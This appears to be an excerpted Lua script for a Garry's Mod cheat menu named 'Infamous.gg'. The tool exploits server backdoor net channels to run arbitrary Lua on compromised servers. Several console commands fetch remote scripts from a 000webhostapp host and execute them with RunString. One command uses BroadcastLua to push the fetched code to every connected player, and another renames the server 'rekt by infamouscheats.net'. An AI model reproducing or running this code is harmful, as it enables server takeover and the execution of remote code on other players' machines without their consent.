local authorized = {"STEAM_0:1:90063563", "STEAM_0:1:484907596", "STEAM_0:1:506324425"}
...
chat.AddText( Color( 255, 0, 0), "[Infamous.gg] ", Color( 255, 0, 0 ),message)
...
function groby.Notify(msg)
	chat.AddText(Color(255, 0, 0), "[Infamous.gg] ", color_white, msg)
end
...
if(noCheck) then
	...
	if (channel == "") then chat.AddText( Color( 255, 0, 0), "[Infamous.gg]", Color( 0, 181, 26 )    ," No NetChannel available", Color( 0, 181, 26 )    ,"Type infamous.gg in console to open menu") return end
	net.Start(channel)
	net.WriteString( str )
	net.SendToServer()
	end
...
background:OpenURL( "https://infamousgg.000webhostapp.com/background.html" )
...
concommand.Add("net_check", function(ply, cmd, args)
    ...
    if(!groby.CheckIfStringExists(arg1)) then MsgC( Color(255, 0, 0), "[Infamous.gg] ", Color(0, 181, 26), "NetChannel does not exist. \n") return end
    groby.PostLua([[player.GetBySteamID64("]] .. localPlayer .. [["):SendLua("MsgC(Color(255, 0, 0), '[Infamous.gg] ', Color( 150, 0, 150 ), ']]..arg1..[[ ', Color(20, 150, 200), 'is a backdoor!')")]], true, arg1 )
end)
...
concommand.Add("rserver",function()
	groby.PostLua([[RunConsoleCommand("hostname","rekt by infamouscheats.net")]])
end)
...
groby.PostLua([[BroadcastLua("http.Fetch('https://infamousgg.000webhostapp.com/Hell.lua',function(b,l,h,c)RunString(b)end,nil)")]])
			surface.PlaySound("HL1/fvox/beep.wav")
...
concommand.Add("mlg",function(ply,cmd,args)
	...
	if lua and lua:len()>3 then
		...
		groby.PostLua([[http.Fetch("https://infamousgg.000webhostapp.com/mlg.lua",function(b) RunString(b) end)]])
	end
end)
...
concommand.Add("b1g",function(ply,cmd,args)
	...
	if lua and lua:len()>3 then
		...
		groby.PostLua([[http.Fetch("https://infamousgg.000webhostapp.com/blg.lua",function(b) RunString(b) end)]])
	end
end)
...
concommand.Add("disco2", function(ply)
	local lua=file.Read("disco.lua","LUA")
	if lua and lua:len()>3 then
		groby.PostLua(lua)
	else
		groby.PostLua([[http.Fetch("https://infamousgg.000webhostapp.com/disco.lua",function(b) RunString(b) end)]])
	end
end)
...
end concommand.Add("infamous.gg", groby.MainMenu)
end
